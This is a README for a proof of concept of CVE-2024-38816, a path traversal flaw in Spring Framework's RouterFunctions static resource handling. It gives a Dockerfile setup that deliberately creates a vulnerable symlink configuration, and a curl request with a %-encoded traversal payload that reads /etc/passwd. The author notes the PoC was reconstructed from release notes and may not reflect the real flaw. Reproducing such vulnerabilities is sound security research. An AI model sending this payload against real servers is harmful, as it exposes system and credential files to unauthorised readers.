# CVE-2024-38816 Proof of Concept (PoC)

This is a proof of concept for the CVE-2024-38816 vulnerability, demonstrating a path traversal exploit.

## Execution Steps
1. Build the Docker image: (Spring Boot 3.0.13, based on Spring Framework 6.0.3)
   ```
   docker build -t cve-2024-38816-poc .
   ```
2. Run the container and expose port 8080 to the host machine:
   ```
   docker run -d -p 8080:8080 --name cve-2024-38816-poc cve-2024-38816-poc
   ```
3. Run the following command to execute the PoC and confirm the vulnerability:
   ```
   curl http://localhost:8080/static/link/%2e%2e/etc/passwd
   ```

   If the contents of the `/etc/passwd` file are displayed, the vulnerability is confirmed.

## Notes
This PoC was created based on an analysis of the release notes and commit logs. The behavior of the actual vulnerability may differ, so accuracy is not guaranteed. Use at your own risk.

## Considerations
1. The vulnerability was patched in Spring Framework 6.1.13, as confirmed by the [release notes](https://github.com/spring-projects/spring-framework/releases/tag/v6.1.13).

2. Upon reviewing the release notes and related commit logs, I have identified the following two issues as potentially linked to this vulnerability:
   - [Issue #33424](https://github.com/spring-projects/spring-framework/issues/33424): A new option related to symbolic links was added.
     - Related commit: [5d80d75051f395c17f6b9367e267d458585b336d](https://github.com/spring-projects/spring-framework/commit/5d80d75051f395c17f6b9367e267d458585b336d)
   - [Issue #33434](https://github.com/spring-projects/spring-framework/issues/33434): The code for sanitizing %-encoded characters was modified.
     - Related commit: [d86bf8b2056429edf5494456cffcb2b243331c49](https://github.com/spring-projects/spring-framework/commit/d86bf8b2056429edf5494456cffcb2b243331c49)

3. According to the [security advisory](https://spring.io/security/cve-2024-38816), the following conditions likely need to be met for the attack to succeed:
   - `RouterFunctions` is used
   - `FileSystemResource` is used
   - Symbolic links are present
   - %-encoded characters are involved in the attack

## Environment Setup
A Docker environment is used to reproduce the vulnerability.

1. Create `PathTraversalDemoApplication.java` with the following code to set up static file routing using `RouterFunction` and `FileSystemResource`:
    ```
    public RouterFunction<ServerResponse> staticResourceRouter() {
        return RouterFunctions.resources("/static/**", new FileSystemResource("/app/static/"));
    }
    ```

2. Add the following command to the Dockerfile to create a symbolic link:
    ```
    RUN ln -s /static /app/static/link
    ```

3. Create a payload that leverages %-encoding to traverse directories through the symbolic link.
   - Path: `/static/link/%2e%2e/etc/passwd`

4. Use the following `curl` command to execute the PoC and verify if the attack is successful:
    ```
    curl http://localhost:8080/static/link/%2e%2e/etc/passwd
    ```
   If the attack is successful, the contents of the `/etc/passwd` file will be displayed.

## Disclaimer
This PoC is provided for educational and security research purposes. Before using this in a real system, ensure the vulnerability has been fixed and you have proper authorization. The author takes no responsibility for any misuse of this code.
